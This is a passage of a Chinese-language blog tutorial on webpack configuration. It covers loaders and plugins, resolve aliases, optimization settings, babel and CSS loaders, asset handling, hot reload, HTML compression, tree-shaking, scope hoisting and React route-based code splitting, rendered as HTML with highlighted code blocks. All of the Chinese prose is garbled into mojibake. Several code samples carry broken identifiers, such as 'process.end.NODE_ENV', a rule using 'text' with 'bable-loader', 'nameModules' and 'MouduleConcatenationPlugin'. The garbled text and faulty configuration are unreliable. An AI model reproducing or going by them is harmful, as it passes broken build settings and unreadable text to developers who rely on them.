productionï¼ŒæŒ‡å®šåä¼šè®¾ç½®<code>process.end.NODE_ENV</code>ä¸ºè¯¥å€¼ï¼Œå¹¶é»˜è®¤å¼€å¯ä¸€äº›æ’ä»¶ã€‚</p></li><li><p>loader<br>webpack å¼€ç®±å³ç”¨åªæ”¯æŒ js å’Œ json ä¸¤ç§æ–‡ä»¶ç±»å‹ï¼Œé€šè¿‡ loaders å»æ”¯æŒå…¶ä»–æ–‡ä»¶ç±»å‹å¹¶ä¸”æŠŠå®ƒä»¬è½¬æ¢æˆæœ‰æ•ˆçš„æ¨¡å—ï¼Œå¹¶ä¸”å¯ä»¥æ·»åŠ åˆ°ä¾èµ–å›¾ä¸­ã€‚loader æœ¬èº«æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œæ¥å—æºæ–‡ä»¶ä½œä¸ºå‚æ•°ï¼Œè¿”å›è½¬æ¢çš„ç»“æœã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">test æŒ‡å®šåŒ¹é…è§„åˆ™</span><br><span class="line">use æŒ‡å®šloaderåç§°</span><br><span class="line">options å¯é€‰é¡¹</span><br><span class="line">include, exclude, oneOf æŒ‡å®šæ–‡ä»¶èŒƒå›´</span><br></pre></td></tr></table></figure></li><li><p>plugin<br>æ’ä»¶ç”¨äº bundle æ–‡ä»¶çš„ä¼˜åŒ–ï¼Œèµ„æºç®¡ç†å’Œç¯å¢ƒå˜é‡æ³¨å…¥ï¼Œä½œç”¨äºæ•´ä¸ªæ„å»ºè¿‡ç¨‹</p></li><li><p>devtool<br>é€‰æ‹©ä¸€ç§source mapæºæ˜ å°„æ–¹å¼ï¼Œæ–¹ä¾¿è°ƒè¯•ã€‚</p></li><li><p>devServer<br>é…ç½®ä»£ç†</p></li><li><p>server<br>é…ç½®webserver</p></li></ul><p><br></p><h4 id="1-3-ç®€å†™è·¯å¾„ï¼Œæ–°å¢æ¨¡å—ç›®å½•"><a href="#1-3-ç®€å†™è·¯å¾„ï¼Œæ–°å¢æ¨¡å—ç›®å½•" class="headerlink" title="1.3 ç®€å†™è·¯å¾„ï¼Œæ–°å¢æ¨¡å—ç›®å½•"></a>1.3 ç®€å†™è·¯å¾„ï¼Œæ–°å¢æ¨¡å—ç›®å½•</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">resolve: &#123;</span><br><span class="line">  <span class="comment">// é…ç½®ç®€å†™è·¯å¾„</span></span><br><span class="line">  alias: &#123;</span><br><span class="line">    <span class="string">'@'</span>: path.join(__dirname, <span class="string">'..'</span>, <span class="string">'src'</span>)</span><br><span class="line">  &#125;, </span><br><span class="line">  <span class="comment">// å¢åŠ ä¸€ä¸ªæ¨¡å—æœç´¢ç›®å½•ï¼Œæ­¤ç›®å½•ä¼˜å…ˆäº node_modules/</span></span><br><span class="line">  modules: [path.resolve(__dirname, <span class="string">'src'</span>), <span class="string">'node_modules'</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br></p><h4 id="1-4-optimization"><a href="#1-4-optimization" class="headerlink" title="1.4 optimization"></a>1.4 optimization</h4><p>webpack4å¼€å§‹ï¼Œä¸åŒçš„modeä¼šæ‰§è¡Œä¸åŒçš„ä¼˜åŒ–ï¼Œproductionä¸developmentçš„åŒºåˆ«å¦‚ä¸‹ï¼š<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">optimization: &#123;</span><br><span class="line">  minimize: <span class="literal">true</span>,       <span class="comment">// ä½¿ç”¨TerserPluginå‹ç¼©bundle</span></span><br><span class="line">  nameModules: <span class="literal">false</span>,   <span class="comment">// ä½¿ç”¨å¯è¯»å–æ¨¡å—æ ‡è¯†ç¬¦ï¼Œå¸®åŠ©æ›´å¥½æ»´è°ƒè¯•</span></span><br><span class="line">  nameChunks: <span class="literal">false</span>,    <span class="comment">// ä½¿ç”¨å¯è¯»å–chunkæ ‡è¯†ç¬¦</span></span><br><span class="line">  nodeEnv: <span class="string">'production'</span>,<span class="comment">// å°†process.env.NODE_ENVè®¾ç½®ä¸ºä¸€ä¸ªç»™å®šå­—ç¬¦ä¸²</span></span><br><span class="line">  flagIncludedChunks: <span class="literal">false</span>,  <span class="comment">// å·²ç»åŠ è½½è¿‡è¾ƒå¤§çš„chunkä¹‹åï¼Œå°±ä¸å†å»åŠ è½½è¿™äº›chunkå­é›†</span></span><br><span class="line">  occurenceOrder: <span class="literal">false</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>å¸¸è§çš„ç¯å¢ƒé…ç½®å·®å¼‚</p><ul><li>ç”Ÿäº§ç¯å¢ƒå¯èƒ½éœ€è¦åˆ†ç¦» CSS æˆå•ç‹¬çš„æ–‡ä»¶ï¼Œä»¥ä¾¿å¤šä¸ªé¡µé¢å…±äº«åŒä¸€ä¸ª CSS æ–‡ä»¶</li><li>ç”Ÿäº§ç¯å¢ƒéœ€è¦å‹ç¼© HTML/CSS/JS ä»£ç </li><li>ç”Ÿäº§ç¯å¢ƒéœ€è¦å‹ç¼©å›¾ç‰‡</li><li>å¼€å‘ç¯å¢ƒéœ€è¦ç”Ÿæˆ sourcemap æ–‡ä»¶</li><li>å¼€å‘ç¯å¢ƒéœ€è¦æ‰“å° debug ä¿¡æ¯</li><li>å¼€å‘ç¯å¢ƒéœ€è¦ live reload æˆ–è€… hot reload çš„åŠŸèƒ½</li></ul><p><br></p><h3 id="2-loader-plugin"><a href="#2-loader-plugin" class="headerlink" title="2. loader + plugin"></a>2. loader + plugin</h3><h4 id="2-1-è§£æES6ã€JSX"><a href="#2-1-è§£æES6ã€JSX" class="headerlink" title="2.1 è§£æES6ã€JSX"></a>2.1 è§£æES6ã€JSX</h4><p><code>babel-loader</code>ç”¨äºè§£æES6, JSXè¯­æ³•, babelçš„é…ç½®æ–‡ä»¶æ˜¯<code>.bablerc</code><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// npm i @babel/core @babel/preset-env babel-loader -D</span></span><br><span class="line">&#123; <span class="attr">text</span>: <span class="regexp">/\.js$/</span>, <span class="attr">use</span>: <span class="string">'bable-loader'</span> &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// .babelrc æ–‡ä»¶</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="string">"presets"</span>: [</span><br><span class="line"><span class="string">"@babel/preset-env"</span>, <span class="comment">// è§£æ es6 è¯­æ³•</span></span><br><span class="line"><span class="string">"@babel/preset-react"</span> <span class="comment">// è§£æ React JSX</span></span><br><span class="line">]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="2-2-è§£æCSS"><a href="#2-2-è§£æCSS" class="headerlink" title="2.2 è§£æCSS"></a>2.2 è§£æCSS</h4><p><code>css-loader</code>ç”¨äºåŠ è½½.cssæ–‡ä»¶ï¼Œå¹¶ä¸”è½¬æ¢æˆcommonjså¯¹è±¡<br><code>style-loader</code>å°†æ ·å¼é€šè¿‡<code>&lt;style&gt;</code>æ ‡ç­¾æ’å…¥åˆ°headä¸­<br><code>less-loader</code>å°†lessè½¬æ¢æˆcss<br><code>postcss-loader</code> CSSå‰ç¼€è‡ªåŠ¨è¡¥å…¨, æ”¯æŒcssModules<br><code>px2rem</code> pxè‡ªåŠ¨è½¬æ¢ä¸ºrem</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// loaderçš„æ‰§è¡Œæ˜¯é“¾å¼è°ƒç”¨ï¼Œæ‰§è¡Œé¡ºåºæ˜¯ä»å³åˆ°å·¦ã€‚</span></span><br><span class="line">&#123;</span><br><span class="line">  test: <span class="regexp">/.(css|less)$/</span>,</span><br><span class="line">  use: [</span><br><span class="line">    &#123;</span><br><span class="line">      loader: <span class="string">'style-loader'</span>,</span><br><span class="line">      options: &#123;</span><br><span class="line">        insertAt: <span class="string">'top'</span>, <span class="comment">// æ ·å¼æ’å…¥åˆ°&lt;head&gt;</span></span><br><span class="line">        singleton: <span class="literal">true</span>, <span class="comment">// å°†æ‰€æœ‰çš„styleæ ‡ç­¾åˆå¹¶æˆä¸€ä¸ª</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">'css-loader'</span>,</span><br><span class="line">    &#123;</span><br><span class="line">      loader: <span class="string">'postcss-loader'</span>,</span><br><span class="line">      options: &#123;</span><br><span class="line">        plugins: <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">          <span class="built_in">require</span>(<span class="string">'autoprefixer'</span>)(&#123;</span><br><span class="line">            browser: [<span class="string">'last 2 version'</span>, <span class="string">'&gt;1%'</span>, <span class="string">'ios 7'</span>]</span><br><span class="line">          &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">'less-loader'</span>,</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>MiniCssExtractPlugin</code> å°†æ ·å¼æå–åˆ°ä¸€ä¸ªå…¬å…±æ–‡ä»¶ï¼Œæ³¨æ„å®ƒå’Œ less-loader çš„åŠŸèƒ½æ˜¯äº’æ–¥çš„ï¼Œæ­¤æ—¶è¦å»æ‰ less-loaderã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å°†æ ·å¼æå–åˆ°å…¬ç”¨æ–‡ä»¶</span></span><br><span class="line">&#123;</span><br><span class="line">  test: <span class="regexp">/.(css|less)$/</span>,</span><br><span class="line">  use: [</span><br><span class="line">    MiniCssExtractPlugin.loader,</span><br><span class="line">    <span class="string">'css-loader'</span></span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br><span class="line">plugins: [</span><br><span class="line">  <span class="comment">// cssæ–‡ä»¶å‹ç¼©</span></span><br><span class="line">  <span class="keyword">new</span> OptimizeCSSAssetsPlugin(&#123;</span><br><span class="line">    assetNameRegExp: <span class="regexp">/.css$/g</span>,</span><br><span class="line">    cssProcessor: <span class="built_in">require</span>(<span class="string">'cssnano'</span>)</span><br><span class="line">  &#125;),</span><br><span class="line">  <span class="keyword">new</span> MiniCssExtractPlugin(&#123;</span><br><span class="line">    filename: <span class="string">'[name]_[contenthash:8].css'</span></span><br><span class="line">  &#125;)</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p><br></p><h4 id="2-3-è§£æå›¾ç‰‡å­—ä½“"><a href="#2-3-è§£æå›¾ç‰‡å­—ä½“" class="headerlink" title="2.3 è§£æå›¾ç‰‡å­—ä½“"></a>2.3 è§£æå›¾ç‰‡å­—ä½“</h4><p><code>file-loader</code>ç”¨äºå¤„ç†æ–‡ä»¶ã€‚<code>url-loader</code>å¯ä»¥å°†è¾ƒå°èµ„æºè½¬æ¢ä¸ºbase64<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  test: <span class="regexp">/.(png|jpg|jpeg)$/</span>,</span><br><span class="line">  use: [&#123;</span><br><span class="line">    loader: <span class="string">'url-loader'</span>,</span><br><span class="line">    options: &#123;</span><br><span class="line">      limit: <span class="number">10240</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;]</span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line">  test: <span class="regexp">/.(woff|woff2|ttf|eot|otf)$/</span>,</span><br><span class="line">  use: [&#123;</span><br><span class="line">    loader: <span class="string">'file-loader'</span>,</span><br><span class="line">    options: &#123;</span><br><span class="line">      name: <span class="string">'assets/[name][hash:8].[ext]'</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="2-4-çƒ­æ›´æ–°"><a href="#2-4-çƒ­æ›´æ–°" class="headerlink" title="2.4 çƒ­æ›´æ–°"></a>2.4 çƒ­æ›´æ–°</h4><p>æ–‡ä»¶ç›‘å¬æ˜¯åœ¨å‘ç°æºç å˜åŒ–æ—¶ï¼Œè‡ªåŠ¨é‡æ–°æ„é€ å‡ºæ–°çš„è¾“å‡ºæ–‡ä»¶ã€‚webpackä¸­å¼€å¯ç›‘å¬æ¨¡å¼ï¼Œæœ‰ä¸¤ç§æ–¹å¼</p><ul><li><code>webpack --watch</code></li><li>webpack.config.jsä¸­è®¾ç½®<code>watch: true</code></li></ul><p>è™½ç„¶ webpack ä¼šè‡ªåŠ¨æ„å»ºï¼Œä½†æ˜¯æµè§ˆå™¨ä¸ä¼šè‡ªåŠ¨æ›´æ–°</p><ul><li>webpack-dev-serverï¼Œlocalhost å¯è®¿é—®é¡µé¢</li><li>HotModuleReplacementPlugin æ’ä»¶ï¼Œä¸ç”¨æ‰‹åŠ¨åˆ·æ–°æµè§ˆå™¨</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// npm install webpack-dev-server -D</span></span><br><span class="line"><span class="comment">// &#123; scripts: &#123; "dev": "webpack-dev-server --open" &#125;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> webpack = <span class="built_in">require</span>(<span class="string">'webpack'</span>);</span><br><span class="line"></span><br><span class="line">plugins: [</span><br><span class="line">  <span class="keyword">new</span> webpack.HotModuleReplacementPlugin()</span><br><span class="line">],</span><br><span class="line">devServer: &#123;</span><br><span class="line">  contentBase: <span class="string">'./dist'</span>,</span><br><span class="line">  hot: <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br></p><p><br></p><h4 id="2-6-æ–‡ä»¶å‹ç¼©"><a href="#2-6-æ–‡ä»¶å‹ç¼©" class="headerlink" title="2.6 æ–‡ä»¶å‹ç¼©"></a>2.6 æ–‡ä»¶å‹ç¼©</h4><p><code>optimize-css-assets-webpack-plugin</code> CSSå‹ç¼©<br><code>uglifyjs-webpack-plugin</code> JSå‹ç¼©<br><code>html-webpack-plugin</code> HTMLå‹ç¼©</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">plugins: [</span><br><span class="line">  <span class="keyword">new</span> HtmlWebpackPlugin(&#123;</span><br><span class="line">    template: path.join(__dirname, <span class="string">'src/search.html'</span>), <span class="comment">// æŒ‡å®šæ¨¡æ¿</span></span><br><span class="line">    filename: <span class="string">'search.html'</span>, <span class="comment">// æ‰“åŒ…å‡ºæ¥çš„æ–‡ä»¶å</span></span><br><span class="line">    chunks: [<span class="string">'search'</span>], <span class="comment">// ä½¿ç”¨äº†å“ªäº›entry chunk</span></span><br><span class="line">    inject: <span class="literal">true</span>, <span class="comment">// js, cssè‡ªåŠ¨æ³¨å…¥åˆ°html</span></span><br><span class="line">    minify: &#123;</span><br><span class="line">      html5: <span class="literal">true</span>,</span><br><span class="line">      collapseWhitespace: <span class="literal">true</span>,</span><br><span class="line">      preserveLineBreads: <span class="literal">false</span>,</span><br><span class="line">      minifyCSS: <span class="literal">true</span>,</span><br><span class="line">      minifyJS: <span class="literal">true</span>,</span><br><span class="line">      removeComments: <span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">];</span><br></pre></td></tr></table></figure><p><br></p><h4 id="2-7-èµ„æºå†…è”"><a href="#2-7-èµ„æºå†…è”" class="headerlink" title="2.7 èµ„æºå†…è”"></a>2.7 èµ„æºå†…è”</h4><p><code>raw-loader</code>å†…è”HTML, JSã€‚å†…è”CSSï¼Œç”¨style-loader / html-inline-css-webpack-plugin<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">$&#123;<span class="built_in">require</span>(<span class="string">'raw-loader!babel-loader!./meta.html'</span>)&#125;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">$&#123;<span class="built_in">require</span>(<span class="string">'raw-loader!../node-modules/lib-flexible.js'</span>)&#125;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="2-8-æš´éœ²å…¨å±€å˜é‡"><a href="#2-8-æš´éœ²å…¨å±€å˜é‡" class="headerlink" title="2.8 æš´éœ²å…¨å±€å˜é‡"></a>2.8 æš´éœ²å…¨å±€å˜é‡</h4><p><br></p><h3 id="3-ä¼˜åŒ–ç”Ÿäº§é…ç½®"><a href="#3-ä¼˜åŒ–ç”Ÿäº§é…ç½®" class="headerlink" title="3. ä¼˜åŒ–ç”Ÿäº§é…ç½®"></a>3. ä¼˜åŒ–ç”Ÿäº§é…ç½®</h3><h4 id="3-1-Tree-Shaking"><a href="#3-1-Tree-Shaking" class="headerlink" title="3.1 Tree-Shaking"></a>3.1 Tree-Shaking</h4><p>ä¸€ä¸ªæ¨¡å—å¯èƒ½æœ‰å¤šä¸ªæ–¹æ³•ï¼Œåªè¦å…¶ä¸­çš„æŸä¸ªæ–¹æ³•ä½¿ç”¨åˆ°äº†ï¼Œåˆ™æ•´ä¸ªæ–‡ä»¶éƒ½ä¼šè¢«æ‰“åˆ°bundleé‡Œï¼Œtree-shakingåªæŠŠç”¨åˆ°çš„æ–¹æ³•æ‰“å…¥bundleï¼Œæ²¡ç”¨åˆ°çš„æ–¹æ³•ä¼šåœ¨uglifyé˜¶æ®µè¢«æ“¦é™¤ã€‚è¦æ±‚å¿…é¡»æ˜¯ES6çš„è¯­æ³•</p><p>Webpacké»˜è®¤æ”¯æŒå¼€å¯tree-shakingï¼Œè®¾ç½®<em><code>mode: &#39;production&#39;</code></em>å³å¯ã€‚æˆ–åœ¨.babelrcé‡Œè®¾ç½®<em><code>modules: false</code></em>å³å¯ã€‚</p><p><br></p><h4 id="3-2-Scope-Hoisting"><a href="#3-2-Scope-Hoisting" class="headerlink" title="3.2 Scope Hoisting"></a>3.2 Scope Hoisting</h4><p>æ„é€ åçš„ä»£ç å­˜åœ¨å¤§é‡å‡½æ•°é—­åŒ…åŒ…è£¹ä»£ç ï¼Œå¯¼è‡´ä½“ç§¯å¢å¤§ï¼ˆæ¨¡å—è¶Šå¤šè¶Šæ˜æ˜¾ï¼‰ã€‚è¿è¡Œä»£ç æ—¶åˆ›å»ºçš„å‡½æ•°ä½œç”¨äºå˜å¤šï¼Œå†…å­˜å¼€é”€å˜å¤§ã€‚<em><code>Scope Hositing</code></em>è¯‘ä¸ºä½œç”¨åŸŸæå‡ã€‚å®ƒå°†æ‰€æœ‰æ¨¡å—çš„ä»£ç æŒ‰ç…§å¼•ç”¨é¡ºåºæ”¾åœ¨ä¸€ä¸ªå‡½æ•°ä½œç”¨åŸŸé‡Œï¼Œç„¶åé€‚å½“çš„é‡å‘½åä¸€äº›å˜é‡ä»¥é˜²æ­¢å˜é‡åå†²çªã€‚ä»è€Œå‡å°‘å‡½æ•°å£°æ˜ä»£ç å’Œå†…å­˜å¼€é”€ã€‚</p><p>Webpack4è®¾ç½®<em><code>mode: production</code></em>ï¼Œä¼šé»˜è®¤å¼€å¯scope hoistingã€‚<br>Webpack3ä¸­éœ€è¦å¢åŠ <em><code>new webpack.optimize.MouduleConcatenationPlugin()</code></em>ã€‚</p><p><br></p><h4 id="3-1-æå–å…¬ç”¨èµ„æº"><a href="#3-1-æå–å…¬ç”¨èµ„æº" class="headerlink" title="3.1 æå–å…¬ç”¨èµ„æº"></a>3.1 æå–å…¬ç”¨èµ„æº</h4><p>æå–å…¬å…±èµ„æº<br>CommonSplitChunk</p><p><br></p><h4 id="3-4-ä»£ç åˆ†ç¦»"><a href="#3-4-ä»£ç åˆ†ç¦»" class="headerlink" title="3.4 ä»£ç åˆ†ç¦»"></a>3.4 ä»£ç åˆ†ç¦»</h4><p>æŠŠä»£ç åˆ†ç¦»åˆ°ä¸åŒçš„bundleä¸­ï¼Œå¯ä»¥æŒ‰éœ€åŠ è½½æˆ–å¹¶è¡ŒåŠ è½½è¿™äº›æ–‡ä»¶ã€‚å¸¸ç”¨çš„ä»£ç åˆ†ç¦»æœ‰ä¸‰ç§ï¼š</p><ul><li>å…¥å£èµ·ç‚¹ï¼š ä½¿ç”¨<code>entry</code>é…ç½®æ‰‹åŠ¨åœ°åˆ†ç¦»ä»£ç </li><li>é˜²æ­¢é‡å¤ï¼š ä½¿ç”¨<code>SplitChunksPlugin</code>åˆ†ç¦»chunk</li><li>åŠ¨æ€å¯¼å…¥ï¼š é€šè¿‡æ¨¡å—ä¸­çš„å†…è”å‡½æ•°è°ƒç”¨æ¥åˆ†ç¦»ä»£ç <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  entry: &#123;</span><br><span class="line">    index: <span class="string">'./src/index.js'</span></span><br><span class="line">  &#125;,</span><br><span class="line">  output: &#123;</span><br><span class="line">    filename: <span class="string">'[name].bundle.js'</span>,</span><br><span class="line">    chunkFilename: <span class="string">'[name].bundle.js'</span>,</span><br><span class="line">    path: path.resolve(__dirname, <span class="string">'dist'</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>åœ¨Reactä¸­æ ¹æ®è·¯ç”±åšä»£ç åˆ†å‰²<br>src/index.js<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncComponent <span class="keyword">from</span> <span class="string">'./async-component'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// è·å–åˆ°å¼‚æ­¥ç»„ä»¶</span></span><br><span class="line"><span class="keyword">const</span> AsyncDemo = asyncComponent(<span class="function"><span class="params">()</span> =&gt;</span> <span class="keyword">import</span>(<span class="string">'./demo'</span>))</span><br><span class="line"></span><br><span class="line">render() &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;Route path=<span class="string">"/demo"</span> component=&#123;AsyncDemo&#125;&gt;<span class="xml"><span class="tag">&lt;/<span class="name">Route</span>&gt;</span></span></span><br><span class="line">  )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>src/async-component.js<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> React, &#123;Component&#125; <span class="keyword">from</span> <span class="string">'react'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @param &#123;Function&#125; loadComponent e.g: () =&gt; import('./component')</span></span><br><span class="line"><span class="comment"> * @param &#123;ReactNode&#125; placeholder  æœªåŠ è½½å‰çš„å ä½</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> (loadComponent, placeholder = <span class="literal">null</span>) =&gt; &#123;</span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">AsyncComponent</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">    unmount = <span class="literal">false</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">constructor</span>() &#123;</span><br><span class="line">      <span class="keyword">super</span>()</span><br><span class="line"></span><br><span class="line">      <span class="keyword">this</span>.state = &#123;</span><br><span class="line">        component: <span class="literal">null</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    componentWillUnmount() &#123;</span><br><span class="line">      <span class="keyword">this</span>.unmount = <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">async</span> componentDidMount() &#123;</span><br><span class="line">      <span class="keyword">const</span> &#123;<span class="attr">default</span>: component&#125; = <span class="keyword">await</span> loadComponent()</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(<span class="keyword">this</span>.unmount) <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">this</span>.setState(&#123;</span><br><span class="line">        component: component</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    render() &#123;</span><br><span class="line">      <span class="keyword">const</span> C = <span class="keyword">this</span>.state.component</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> (</span><br><span class="line">        C ? <span class="xml"><span class="tag">&lt;<span class="name">C</span> &#123;<span class="attr">...this.props</span>&#125;&gt;</span><span class="tag">&lt;/<span class="name">C</span>&gt;</span></span> : placeholder</span><br><span class="line">      )</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> AsyncComponent</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="4-åŠ å¿«æ‰“åŒ…é€Ÿåº¦"><a href="#4-åŠ å¿«æ‰“åŒ…é€Ÿåº¦" class="headerlink" title="4. åŠ å¿«æ‰“åŒ…é€Ÿåº¦"></a>4. åŠ å¿«æ‰“åŒ…é€Ÿåº¦</h3><h4 id="4-1-ç¼“å­˜åŠ å¿«äºŒæ¬¡æ„å»º"><a href="#4-1-ç¼“å­˜åŠ å¿«äºŒæ¬¡æ„å»º" class="headerlink" title="4.1 ç¼“å­˜åŠ å¿«äºŒæ¬¡æ„å»º"></a>4.1 ç¼“å­˜åŠ å¿«äºŒæ¬¡æ„å»º</h4><h4 id="4-2-ç¼©å°æ„å»ºç›®æ ‡"><a href="#4-2-ç¼©å°æ„å»ºç›®æ ‡" class="headerlink" title="4.2 ç¼©å°æ„å»ºç›®æ ‡"></a>4.2 ç¼©å°æ„å»ºç›®æ 